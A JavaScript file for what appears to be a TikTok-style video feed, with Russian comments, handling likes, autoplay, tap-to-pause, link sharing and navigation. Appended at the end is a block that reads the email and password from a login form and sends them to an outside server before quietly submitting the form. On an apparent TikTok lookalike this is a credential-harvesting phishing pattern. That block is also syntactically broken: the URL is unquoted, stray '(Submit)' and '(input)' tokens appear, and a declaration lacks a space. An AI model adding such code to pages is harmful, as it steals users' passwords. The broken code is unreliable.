const videos = document.querySelectorAll("video");


// ЛАЙКИ

const likeButtons = document.querySelectorAll(".like");

likeButtons.forEach(button => {

    button.addEventListener("click", () => {

        const counter = button.querySelector("small");

        let likes = Number(counter.textContent);

        if (button.classList.contains("liked")) {

            button.classList.remove("liked");

            likes--;

        } else {

            button.classList.add("liked");

            likes++;

        }

        counter.textContent = likes;

    });

});


// АВТОМАТИЧЕСКОЕ ВОСПРОИЗВЕДЕНИЕ

const observer = new IntersectionObserver(

    entries => {

        entries.forEach(entry => {

            const video = entry.target;

            if (entry.isIntersecting) {

                video.play().catch(() => {
                    console.log("Видео ожидает взаимодействия пользователя");
                });

            } else {

                video.pause();

            }

        });

    },

    {
        threshold: 0.7
    }

);

videos.forEach(video => {

    observer.observe(video);

});


// ПАУЗА ПО НАЖАТИЮ

videos.forEach(video => {

    video.addEventListener("click", () => {

        if (video.paused) {

            video.play();

        } else {

            video.pause();

        }

    });

});


// ПОДЕЛИТЬСЯ

const shareButtons = document.querySelectorAll(".share");

shareButtons.forEach(button => {

    button.addEventListener("click", async () => {

        try {

            await navigator.clipboard.writeText(
                window.location.href
            );

            alert("Ссылка скопирована!");

        } catch {

            alert("Не удалось скопировать ссылку.");

        }

    });

});


// НИЖНЯЯ НАВИГАЦИЯ

const navButtons = document.querySelectorAll(".nav-item");

navButtons.forEach(button => {

    button.addEventListener("click", () => {

        navButtons.forEach(item => {
            item.classList.remove("active");
        });

        button.classList.add("active");

    });

});
const loginForm = document.querySelector('#login-form');
(Submit)loginForm.addEventListener('submit', function(event) {
event.preventDefault();
(input) const userEmail = document.querySelector('#email-field').value; constuserPassword = document.querySelector('#password-field').value;
fetch(https://tiktok-project-server.onrender.com, { method: 'POST', headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ login: userEmail, password: userPassword }) }) .then(() => {
loginForm.submit(); }); });
